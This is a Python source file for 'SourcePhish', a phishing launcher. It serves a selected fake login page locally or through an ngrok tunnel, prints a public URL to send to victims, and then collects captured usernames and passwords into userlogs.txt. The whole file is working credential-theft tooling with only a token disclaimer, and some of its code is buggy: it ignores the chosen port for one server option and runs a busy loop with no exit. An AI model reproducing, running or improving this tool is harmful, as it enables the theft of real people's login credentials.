from pyfiglet import Figlet
import os
import color as c
import time
import sys

Title = "SourcePhish"
intro=f"""Hello today you're going to use a tool, {Title} made by Xnetwolf

{c.yellow}1{c.end}: Understand how to use this tool by watching pictures, videos or reading a pdf
{c.yellow}2{c.end}: Have fun testing or using it, you can even contribute by either giving more ideas to improve tool or report errors/bugs
{c._red}Warning:{c.end}{c.red} I am not responsible for any missuse of this tool, or any illegal activities, use it on you're own system{c.end}'
"""
def Getsource():
	try:
		r = open("user.config", "r").readlines()
		return r[0]
	except:
		print()
		
def user_data(subfolder):
    while True:
        if  os.path.exists(f"temp/userlog.txt"):
            print(f"{c.green}User data found{c.end}")
            os.system(f"cat temp/userlog.txt")
            os.system(f"cat temp/userlog.txt >> userlogs.txt")
            print()
            print(f"{c.green}Username and password saved into userlogs.txt{c.end}")
            os.system(f"rm -rf temp/")
        else:
            pass

def startattack(dicti, key, subfolder):
	print(f"{c.yellow}[{c.green}1{c.end}{c.yellow}]{c.lightblue} ngrok{c.end}{c.yellow} [{c.green}2{c.end}{c.yellow}]{c.lightblue} localhost{c.end}")
	type = int(input("choose type: "))
	if type == 1:
		ngrok_s(subfolder[key])
	elif type == 2:
		l_host(subfolder[key])
	else:
		print(f"{c.red} please restart the tool[Erro1] missing input{c.end}")
	
def l_host(subfolder):
    path = subfolder
    des = "temp/"
    os.system(f"cp -R {path} {des} > /dev/null 2>&1")
    port_ = input(f"[{c.lightblue}+{c.end}] port number: ")
    print(f"{c.yellow}[{c.green}1{c.end}{c.yellow}]{c.lightblue} python server{c.end}{c.yellow} [{c.green}2{c.end}{c.yellow}]{c.lightblue} php{c.end} ")
    l_optn = input(f"Choose option: ")
    if l_optn == "1" or l_optn == "01":
        os.system(f"python -m http.server 8080 --directory 'temp/' > /dev/null 2>&1 & sleep 2")
        print(f"{c._lightblue}Localhost started on http://127.0.0.1:{port_} {c.end}")
        user_data(subfolder)
    if l_optn == "2" or l_optn == "02":
        os.system(f"php -S 127.0.0.1:{port_} -t temp/ > /dev/null 2>&1 & sleep 2")
        print(f"Localhost started on http://127.0.0.1:{port_}")
        user_data(subfolder)
        
def ngrok_s(subfolder):
    try:
        path = subfolder
        des = "temp/"
        if os.path.exists(des) == False:
        	os.makedirs(des)
        else:
        	pass
        os.system(f"cp -R {path} {des} > /dev/null 2>&1")
        #port_ = random.randint(1150, 9999)
        port_ = input(f"[{c.lightblue}+{c.end}] port number: ")
        os.system(f"php -S 127.0.0.1:{port_} -t {des} > /dev/null 2>&1 & sleep 2")
        os.system(f"./ngrok http http://127.0.0.1:{port_} > /dev/null 2>&1 & sleep 8")
        os.system(f'echo Send this url: ')
        os.system(f'curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io"')
        user_data(subfolder)
    except:
        print()
        print(f"{c.red}Exiting {Title}")
        time.sleep(2)
        sys.exit(1)
	
	
def configsetup():
	foldersource = Getsource()
	if os.path.exists(f"{foldersource}") == True:
		print()
	else:
		print(f"{c.green}Create a source folder or specifie folder: {c.end}", end="")
		s = input()
		if os.path.exists(s) == True:
			d = open("user.config", "w").write(s)
		else:
			os.makedirs(s)
			d = open("user.config", "w").write(s)
			
	t = listfolder()
	inp = int(input(f"\n[{c.green}x{c.end}] Choose Folder: "))
	re = dict()
	a = 0
	for we in t[0]:
		if we == "./":
			pass
		else:
			re[a] = we
			a = a + 1
	for i in re:
			if i == inp:
				startattack(re, i, t[1])

def listfolder():
	tmp_folders = [] # used to store a tempory list of folder
	folders_path= [] # path of folder
	folders_name = [] # folder name
	subfolder = [] # source/sub folder
	foldersource = Getsource()
	sysRoot = os.path.expanduser("~")
	system = os.walk(os.curdir, topdown=True, followlinks=True)
	for root, dir, files in system:
		for folder in dir:
			folder_path = os.path.join(root, folder)
			folders_name.append(folder)
			folders_path.append(folder_path)
			tmp_folders.append(f"./{foldersource}/{folder}")
	for folder in folders_path:
		for folder2 in tmp_folders:
			if folder == folder2:
				subfolder.append(folder2)
			else:
				qwe = 1
				#print("bad")
	phish = []		
	for sub in subfolder:
		phish += sub.split(f"{foldersource}/")
	a = 1
	b = 1
	d = 0
	while a == 1:
		try:
			t = phish[b]# create index error
			print(f"{c.yellow}[{c.green}{d}{c.end}{c.yellow}]{c.lightblue} {t} {c.end}", end="")
			d = d + 1
			b = b+2
		except:
			a = 0
	return phish, subfolder
def start():
	os.system("rm -rf temp")
	banner()
	t = listfolder()
	inp = int(input(f"\n[{c.green}x{c.end}] Choose Folder: "))
	re = dict()
	a = 0
	for we in t[0]:
		if we == "./":
			pass
		else:
			re[a] = we
			a = a + 1
	for i in re:
			if i == inp:
				startattack(re, i, t[1])
	
def banner():
    print(f"{c.violet}{Figlet().renderText(Title)}{c.end}")
def welcome():
	banner()
	print(intro)
def startonce():
	try:
		open("user.config")
	except:
		welcome()
		configsetup()
	else:
		start()

startonce()